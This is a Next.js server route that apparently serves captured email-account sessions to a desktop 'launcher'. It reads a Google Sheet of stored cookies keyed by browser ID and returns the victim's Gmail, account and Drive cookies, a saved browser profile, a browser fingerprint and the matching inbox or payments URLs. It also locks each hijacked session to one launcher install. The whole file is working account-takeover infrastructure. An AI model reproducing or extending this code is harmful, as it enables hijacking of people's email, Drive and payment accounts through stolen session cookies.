import { NextResponse } from 'next/server';
import { getSheetDataApi, updateSheetRowApi, ensureSheetColumns } from '../../api/googlesheets.js';
import axios from 'axios';

export const maxDuration = 30;
export const dynamic = 'force-dynamic';

const MAIN_API = process.env.MAIN_API_URL || 'https://webfixx-hoo-oamupo-e98ced-157-173-204-24.sslip.io/api';


const FREE_MS_DOMAINS = new Set([
    'outlook.com', 'hotmail.com', 'live.com', 'windowslive.com',
    'outlook.co.uk', 'hotmail.co.uk', 'live.co.uk',
    'outlook.ca', 'hotmail.ca', 'live.ca',
    'outlook.co.za', 'hotmail.co.za', 'live.co.za',
    'outlook.com.au', 'hotmail.com.au', 'live.com.au',
    'outlook.fr', 'hotmail.fr', 'live.fr',
    'outlook.de', 'hotmail.de', 'live.de',
    'outlook.it', 'hotmail.it', 'live.it',
    'outlook.es', 'hotmail.es', 'live.es',
    'outlook.jp', 'hotmail.jp', 'live.jp',
    'outlook.com.br', 'hotmail.com.br', 'live.com.br',
    'msn.com', 'live.net'
]);

function resolveSmartPlatformUrls(domain, platform, email) {
    const d = (domain || (email ? email.split('@')[1] : '') || '').toLowerCase().trim();
    const p = (platform || '').toLowerCase().trim();
    const em = (email || '').toLowerCase().trim();

    // 1. Google / Gmail: 3 tabs
    if (p === 'google' || p === 'gmail' || d.includes('google') || d.includes('gmail') || em.endsWith('@gmail.com') || em.endsWith('@googlemail.com')) {
        return [
            'https://mail.google.com/mail/u/0/#inbox',
            'https://myaccount.google.com/payments-and-subscriptions?utm_source=OGB&utm_medium=app&authuser=0',
            'https://drive.google.com/drive/u/0/my-drive'
        ];
    }

    // 2. Outlook / Microsoft / Office 365: 1 tab dynamically resolved
    const isMsDomain = FREE_MS_DOMAINS.has(d) || d.includes('outlook') || d.includes('hotmail') || d.includes('live') || d.includes('msn') || d.includes('microsoft');
    if (p === 'outlook' || p === 'microsoft' || p === 'office365' || isMsDomain) {
        if (FREE_MS_DOMAINS.has(d) || d.includes('outlook') || d.includes('hotmail') || d.includes('live') || d.includes('msn')) {
            return ['https://outlook.live.com/mail/'];
        }
        // Custom domain / Office 365 / corporate paid account
        return ['https://outlook.office.com/mail/'];
    }

    // 3. Yahoo
    if (p === 'yahoo' || d.includes('yahoo') || d.includes('ymail')) {
        return ['https://mail.yahoo.com/'];
    }

    // 4. AOL
    if (p === 'aol' || d.includes('aol')) {
        return ['https://mail.aol.com/'];
    }

    // 5. Fallback for custom domain
    if (d) {
        return [`https://${d}`];
    }

    return ['https://mail.google.com/mail/u/0/#inbox'];
}


const getDirectDownloadUrl = (driveUrl) => {
  if (!driveUrl) return null;
  // Google Drive URL formats: /file/d/ID, /open?id=ID, /d/ID, uc?export=download&id=ID
  const patterns = [
    /\/file\/d\/([a-zA-Z0-9_-]+)/,
    /\/d\/([a-zA-Z0-9_-]+)/,
    /[?&]id=([a-zA-Z0-9_-]+)/,
  ];
  for (const pattern of patterns) {
    const match = driveUrl.match(pattern);
    if (match) {
      return `https://drive.google.com/uc?export=download&id=${match[1]}`;
    }
  }
  // Non-Drive URLs (Cloudinary, R2, B2) are already direct-download links.
  return driveUrl;
};

export async function POST(request) {
  try {
    const body = await request.json();
    const browserId = body.browserId || body.submissionId;
    const token = body.token;
    const launcherKey = body.launcherKey;
    const username = body.username;

    if (!browserId || !token) {
      return NextResponse.json(
        { error: 'Missing required fields: browserId, token' },
        { status: 400 }
      );
    }

    const validateRes = await axios.post(
      `${MAIN_API}/backend-function`,
      new URLSearchParams({
        action: 'backendFunction',
        token,
        functionName: 'updateAppData',
      }),
      {
        headers: { 'Content-Type': 'application/x-www-form-urlencoded' },
        timeout: 15000,
      }
    );

    if (!validateRes.data?.success) {
      return NextResponse.json(
        { error: 'Invalid or expired token' },
        { status: 401 }
      );
    }

    const cookieResult = await getSheetDataApi('cookie');

    if (!cookieResult.success || cookieResult.count === 0) {
      return NextResponse.json(
        { error: 'No cookie data available' },
        { status: 500 }
      );
    }

    const headers = cookieResult.headers;
    const row = cookieResult.data.find((r) => {
      const idx = headers.indexOf('browserId');
      return idx !== -1 && String(r[idx]).trim() === String(browserId).trim();
    });

    if (!row) {
      return NextResponse.json(
        { error: 'Session not found for the given browserId' },
        { status: 404 }
      );
    }

    const col = (key) => {
      const idx = headers.indexOf(key);
      return idx !== -1 ? row[idx] : null;
    };

    // Pillar 3: Session Protection Guard (Enforce 1-Device Rule)
    const launchHistoryRaw = col('launchHistory') || '';
    let parsedLaunchHistory = null;
    if (launchHistoryRaw) {
      try {
        parsedLaunchHistory = typeof launchHistoryRaw === 'string' ? JSON.parse(launchHistoryRaw) : launchHistoryRaw;
      } catch (_) {
        parsedLaunchHistory = null;
      }
    }

    // If this session is locked to a specific launcherKey, reject requests with mismatched keys
    if (parsedLaunchHistory && parsedLaunchHistory.launcherKey) {
      if (launcherKey && parsedLaunchHistory.launcherKey !== launcherKey) {
        return NextResponse.json({
          error: "Access Denied: This session is locked to a different launcher installation."
        }, { status: 403 });
      }
    }

    // Update or initialize launch lease
    const now = new Date().toISOString();
    const updatedHistory = {
      launcherKey: launcherKey || parsedLaunchHistory?.launcherKey || '',
      username: username || parsedLaunchHistory?.username || '',
      firstLaunchedAt: parsedLaunchHistory?.firstLaunchedAt || now,
      lastLaunchedAt: now,
      lastHeartbeat: now,
      status: 'active'
    };

    if (launcherKey) {
      try {
        await ensureSheetColumns('cookie', ['launchHistory']);
        await updateSheetRowApi('cookie', 'browserId', browserId, {
          launchHistory: JSON.stringify(updatedHistory)
        });
      } catch (err) {
        console.warn(`[electron/session-data] Failed to update launchHistory: ${err.message}`);
      }
    }

    const driveUrl = col('driveUrl');
    const email = col('email') || '';
    const domain = col('domain') || (email ? email.split('@')[1].toLowerCase() : '');

    if (!driveUrl) {
      return NextResponse.json(
        { error: 'No saved browser profile found for this session' },
        { status: 404 }
      );
    }

    let cookieJSON = null;
    try {
      const raw = col('cookie') || col('cookieJSON') || col('formattedCookie');
      if (raw) {
        const parsed = typeof raw === 'string' ? JSON.parse(raw) : raw;
        if (Array.isArray(parsed) && parsed.length > 0) cookieJSON = parsed;
      }
    } catch (_) {}

    let accountCookieJSON = null;
    try {
      const raw = col('accountCookie') || col('accountCookieJSON');
      if (raw) {
        const parsed = typeof raw === 'string' ? JSON.parse(raw) : raw;
        if (Array.isArray(parsed) && parsed.length > 0) accountCookieJSON = parsed;
      }
    } catch (_) {}

    let driveCookieJSON = null;
    try {
      const raw = col('driveCookieJSON');
      if (raw) {
        const parsed = typeof raw === 'string' ? JSON.parse(raw) : raw;
        if (Array.isArray(parsed) && parsed.length > 0) driveCookieJSON = parsed;
      }
    } catch (_) {}

    const platform = col('platform') || '';
            
    const platformUrls = resolveSmartPlatformUrls(domain, platform, email);
    const platformUrl = platformUrls[0] || 'https://mail.google.com/mail/u/0/#inbox';

    return NextResponse.json({
      downloadUrl: getDirectDownloadUrl(driveUrl),
      driveUrl,
      domain: domain || '',
      email: col('email') || '',
      category: col('category') || '',
      platform,
      platformUrl,
      platformUrls,
      cookieJSON,
      accountCookieJSON,
      driveCookieJSON,
      browserIdentity: col('browserIdentity') ? (() => { try { return JSON.parse(col('browserIdentity')); } catch (_) { return col('browserIdentity'); } })() : null,
    });
  } catch (error) {
    return NextResponse.json({ error: error.message }, { status: 500 });
  }
}
